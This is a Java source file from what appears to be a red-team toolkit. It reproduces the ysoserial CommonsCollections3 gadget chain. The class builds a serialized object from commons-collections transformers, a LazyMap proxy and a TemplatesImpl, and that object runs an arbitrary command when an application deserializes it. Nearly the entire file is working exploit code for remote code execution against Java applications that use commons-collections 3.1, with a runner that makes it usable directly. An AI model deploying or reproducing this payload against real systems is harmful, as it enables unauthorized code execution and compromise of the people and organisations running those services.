package com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads;

import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.Authors;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.Dependencies;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.PayloadTest;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.Gadgets;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.JavaVersion;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.PayloadRunner;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.Reflections;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;

@SuppressWarnings({"rawtypes", "unchecked", "restriction"})
@PayloadTest(precondition = "isApplicableJavaVersion")
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({Authors.FROHOFF})
public class CommonsCollections3 extends PayloadRunner implements ObjectPayload<Object> {
    public Object getObject(final String command) throws Exception {
        Object templatesImpl = Gadgets.createTemplatesImpl(command);
        final Transformer transformerChain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(1)});
        final Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templatesImpl})
        };
        final Map innerMap = new HashMap();
        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
        final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
        final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);
        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
        return handler;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections3.class, args);
    }

    public static boolean isApplicableJavaVersion() {
        return JavaVersion.isAnnInvHUniversalMethodImpl();
    }
}
